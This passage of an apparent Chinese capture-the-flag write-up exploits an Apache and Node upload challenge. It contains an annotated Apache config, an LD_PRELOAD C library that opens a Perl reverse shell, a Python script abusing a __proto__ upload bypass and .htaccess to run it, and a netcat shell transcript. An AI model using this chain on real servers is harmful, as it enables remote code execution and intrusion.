    #   work with the default configuration.
    # Global configuration
    #
    #
    # ServerRoot: The top of the directory tree under which the server's
    # configuration, error, and log files are kept.
    #
    # NOTE!  If you intend to place this on an NFS (or otherwise network)
    # mounted filesystem then please read the Mutex documentation (available
    # at );
    # you will save yourself a lot of trouble.
    #
    # Do NOT add a slash at the end of the directory path.
    #
    #ServerRoot "/etc/apache2"
    #
    # The accept serialization lock file MUST BE STORED ON A LOCAL DISK.
    #
    #Mutex file:${APACHE_LOCK_DIR} default
    #
    # The directory where shm and other runtime files will be stored.
    #
    DefaultRuntimeDir ${APACHE_RUN_DIR}
    #
    # PidFile: The file in which the server should record its process
    # identification number when it starts.
    # This needs to be set in /etc/apache2/envvars
    #
    PidFile ${APACHE_PID_FILE}
    #
    # Timeout: The number of seconds before receives and sends time out.
    #
    Timeout 300
    #
    # KeepAlive: Whether or not to allow persistent connections (more than
    # one request per connection). Set to "Off" to deactivate.
    #
    KeepAlive On
    #
    # MaxKeepAliveRequests: The maximum number of requests to allow
    # during a persistent connection. Set to 0 to allow an unlimited amount.
    # We recommend you leave this number high, for maximum performance.
    #
    MaxKeepAliveRequests 100
    #
    # KeepAliveTimeout: Number of seconds to wait for the next request from the
    # same client on the same connection.
    #
    KeepAliveTimeout 5
    # These need to be set in /etc/apache2/envvars
    User ${APACHE_RUN_USER}
    Group ${APACHE_RUN_GROUP}
    #
    # HostnameLookups: Log the names of clients or just their IP addresses
    # e.g., www.apache.org (on) or 204.62.129.132 (off).
    # The default is off because it'd be overall better for the net if people
    # had to knowingly turn this feature on, since enabling it means that
    # each client request will result in AT LEAST one lookup request to the
    # nameserver.
    #
    HostnameLookups Off
    # ErrorLog: The location of the error log file.
    # If you do not specify an ErrorLog directive within a 
    # container, error messages relating to that virtual host will be
    # logged here.  If you *do* define an error logfile for a 
    # container, that host's errors will be logged there and not here.
    #
    ErrorLog ${APACHE_LOG_DIR}/error.log  
    # 这种地方是改写不了变量的 或许需要一些我没发现的魔法
    #
    # LogLevel: Control the severity of messages logged to the error_log.
    # Available values: trace8, ..., trace1, debug, info, notice, warn,
    # error, crit, alert, emerg.
    # It is also possible to configure the log level for particular modules, e.g.
    # "LogLevel info ssl:warn"
    #
    LogLevel warn
    # Include module configuration:
    IncludeOptional mods-enabled/*.load
    IncludeOptional mods-enabled/*.conf
    # Include list of ports to listen on
    Include ports.conf
    # Sets the default security model of the Apache2 HTTPD server. It does
    # not allow access to the root filesystem outside of /usr/share and /var/www.
    # The former is used by web applications packaged in Debian,
    # the latter may be used for local directories served by the web server. If
    # your system is serving content from a sub-directory in /srv you must allow
    # access here, or in any related virtual host.
            Options FollowSymLinks
            AllowOverride ALL
            Require all denied
            AllowOverride ALL
            Require all granted
            Options Indexes FollowSymLinks
            AllowOverride ALL
            Require all granted
    #
    #       Options Indexes FollowSymLinks
    #       AllowOverride None
    #       Require all granted
    #
    # AccessFileName: The name of the file to look for in each directory
    # for additional configuration directives.  See also the AllowOverride
    # directive.
    #
    AccessFileName .htaccess
    #
    # The following lines prevent .htaccess and .htpasswd files from being
    # viewed by Web clients.
    #
            Require all denied
    #
    # The following directives define some format nicknames for use with
    # a CustomLog directive.
    #
    # These deviate from the Common Log Format definitions in that they use %O
    # (the actual bytes sent including headers) instead of %b (the size of the
    # requested file), because the latter makes it impossible to detect partial
    # requests.
    #
    # Note that the use of %{X-Forwarded-For}i instead of %h is not recommended.
    # Use mod_remoteip instead.
    #
    LogFormat "%v:%p %h %l %u %t \"%r\" %>s %O \"%{Referer}i\" \"%{User-Agent}i\"" vhost_combined
    LogFormat "%h %l %u %t \"%r\" %>s %O \"%{Referer}i\" \"%{User-Agent}i\"" combined
    LogFormat "%h %l %u %t \"%r\" %>s %O" common
    LogFormat "%{Referer}i -> %U" referer
    LogFormat "%{User-agent}i" agent
    # Include of directories ignores editors' and dpkg's backup files,
    # see README.Debian for details.
    ExtFilterDefine gzip mode=output cmd=/bin/gzip 
    # 这个比较有东西哦 可以看到有命令执行了那么套用类似 PHP Mail bypass disable func 的思路进行利用
    # Include generic snippets of statements
    IncludeOptional conf-enabled/*.conf
    # Include the virtual host configurations:
    IncludeOptional sites-enabled/*.conf
    # vim: syntax=apache ts=4 sw=4 sts=4 sr noet
###  htaccess 滥用 挂载 LD_PERLOAD
    // save as perload.c
    // 编译 gcc perload.c  -fPIC -shared -o 1.so 
    #define _GNU_SOURCE
    #include 
    #include 
    #include 
    extern char** environ;
    __attribute__ ((__constructor__)) void preload (void) // 构建 预执行属性
    {
        const char* cmdline = "perl -e 'use Socket;$i=\"172.18.0.1\";$p=8884;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"bash -i\");};'";
        // const char* cmdline = "perl /tmp/r3.pl > /tmp/r3pwn"
        int i;
        for (i = 0; environ[i]; ++i) {
                if (strstr(environ[i], "LD_PRELOAD")) {
                        environ[i][0] = '\0';
                }
        }
        system(cmdline);
    }
接下来上 python 利用
    import requests
    import hashlib
    target_ip = "127.0.0.1"
    target_upload_port = 31337
    upload_file = ".htaccess"
    target_render_port = 31338
    request_sender_ip = "172.18.0.1"
    request_ip = "::ffff:{}".format(request_sender_ip)
    # 还是 为了好看
    def print_request(response):
        print("request form")
        print("=========================================================")
        print(response.request.method, response.request.url)
        for header_key in response.request.headers.keys():
            print("{}: {}".format(header_key, response.request.headers[header_key]))
        body = response.request.body
        if body == None:
            print("")
        else:
            print( body )
        print("=========================================================")
    def print_response(response):
        print("response form")
        print("=========================================================")
        print(response.status_code, response.url)
        for header_key in response.headers.keys():
            print("{}: {}".format(header_key, response.headers[header_key]))
        print("")
        print(response.text)
        print("=========================================================")
    def md5(string):
        return hashlib.md5(string.encode()).hexdigest()
    # 计算上传路径
    def calc_upload_path(upload_file, form_id ):
        """
        userdir = md5(md5(req.socket.remoteAddress) + sampleFile.md5);
        userfile = sampleFile.name.toString();
        if(userfile.includes('/')||userfile.includes('..')){
          return res.status(500).send("Invalid file name");
        }
        uploadPath = '/uploads/' + userdir + '/' + userfile;
        """
        file_md5 = hashlib.md5(open(upload_file,'rb').read()).hexdigest()
        userdir  = md5(md5(request_ip)+file_md5)
        userfile = form_id
        # upload_path = '/uploads/' + userdir + '/' + userfile # the realworld ctf Env
        upload_path = '/' + userdir + '/'
        return upload_path
    def main():
        ## STEP 4 upload error
        # 上传 1.so
        sofile_path = uplaod_file("1.so")
        code = """SetEnv LD_PRELOAD "/var/www/html{}1.so"
    SetOutputFilter gzip
    ErrorDocument 403 /etc/apache2/apache2.conf
    """.format(sofile_path)
        # 启用 gzip 过滤器 执行命令
        # 生成 htaccess
        htaccess_file_gen(code)
        # 输出 这里为了 debug
        print("sofile_path: ",sofile_path)
        # 上传 htaccess
        htaccess_path = uplaod_file(".htaccess")
        print("htaccess_path: ",htaccess_path)
        print("getshell exec with curl http://{}:{}".format(target_ip,target_render_port)+htaccess_path)
    # 生成代码
    def htaccess_file_gen(code):
        with open(".htaccess","w") as f:
            f.write(code)
        print("gen successfully")
    # 上传文件 利用方法是上面 提到的
    def uplaod_file(filename):
        uplaod_url1 = "http://{}:{}/".format(target_ip, target_upload_port)
        r = requests.get(uplaod_url1)
        form_id = r.text.split("action='")[1].split("'")[0]
        real_form_id = form_id.split('/upload?formid=')[1]
        print("you should use this id: ",real_form_id)
        upload_url2 = "http://{}:{}/upload?formid={}".format(target_ip,target_upload_port,"1")
        files = {
            "__proto__": open(filename,"rb"),
            "decoy":("decoy","random"),
        }
        r2 = requests.post(upload_url2,files=files)
        print_request(r2)
        print_response(r2)
        form_id = real_form_id
        return calc_upload_path(filename,form_id)
    if __name__ == '__main__':
        main()
最后运行结果的 拿到 .htaccess 文件对应的地址 一个 curl 打过去就有了
当然记得起 netcat 的监听
## 最后 Getshell readflag
直接执行一个 readflag 的计算
    └─$ nc -lvvp 8884        
    listening on [any] 8884 ...
    172.18.0.3: inverse host lookup failed: Unknown host
    connect to [172.18.0.1] from (UNKNOWN) [172.18.0.3] 54924
    bash: cannot set terminal process group (31): Inappropriate ioctl for device
    bash: no job control in this shell
    www-data@a17ac98d17ba:/$ ls -al
    ls -al
    total 100
    drwxr-xr-x   1 root root  4096 Jan 27 07:28 .
    drwxr-xr-x   1 root root  4096 Jan 27 07:28 ..
    -rwxr-xr-x   1 root root     0 Jan 27 07:28 .dockerenv
    drwxr-xr-x   2 root root  4096 Jan  5 19:29 bin
    drwxr-xr-x   2 root root  4096 Apr 24  2018 boot
    drwxr-xr-x   5 root root   340 Jan 27 07:28 dev
    drwxr-xr-x   1 root root  4096 Jan 27 07:28 etc
    -r-x------   1 root root    39 Jan 20 09:19 flag
    drwxr-xr-x   2 root root  4096 Apr 24  2018 home
    drwxr-xr-x   1 root root  4096 May 23  2017 lib
    drwxr-xr-x   2 root root  4096 Jan  5 19:29 lib64
    drwxr-xr-x   2 root root  4096 Jan  5 19:27 media
    drwxr-xr-x   2 root root  4096 Jan  5 19:27 mnt
    drwxr-xr-x   2 root root  4096 Jan  5 19:27 opt
    dr-xr-xr-x 334 root root     0 Jan 27 07:28 proc
    -r-sr-xr-x   1 root root 13144 Jan 20 09:16 readflag
    drwx------   1 root root  4096 Jan 27 07:44 root
    drwxr-xr-x   1 root root  4096 Jan 27 07:28 run
    drwxr-xr-x   2 root root  4096 Jan  5 19:29 sbin
    drwxr-xr-x   2 root root  4096 Jan  5 19:27 srv
    dr-xr-xr-x  13 root root     0 Jan 27 07:28 sys
    drwxrwxrwt   1 root root  4096 Jan 27 07:28 tmp
    drwxr-xr-x   1 root root  4096 Jan  5 19:27 usr
    drwxr-xr-x   1 root root  4096 Jan 27 07:28 var
    www-data@a17ac98d17ba:/$ readflag
    readflag
    bash: readflag: command not found
    www-data@a17ac98d17ba:/$ ./readflag
    ./readflag
    Solve the easy challenge first
    (((((-854089)-(772258))+(5324))+(474988))-(-472881))
    input your answer: -673154
    ok! here is your flag!!
    rwctf{cd81450983c06bcb4438dfb8de45ec04}
    www-data@a17ac98d17ba:/$
## Wrap up
总体思路与知识点
  1. 代码审计
  2. proto 利用 | 发现双文件上传 bypass
  3. 利用 htaccess 越界读 获取 一些敏感配置文件
  4. 利用 htaccess 和 一些错误配置 RCE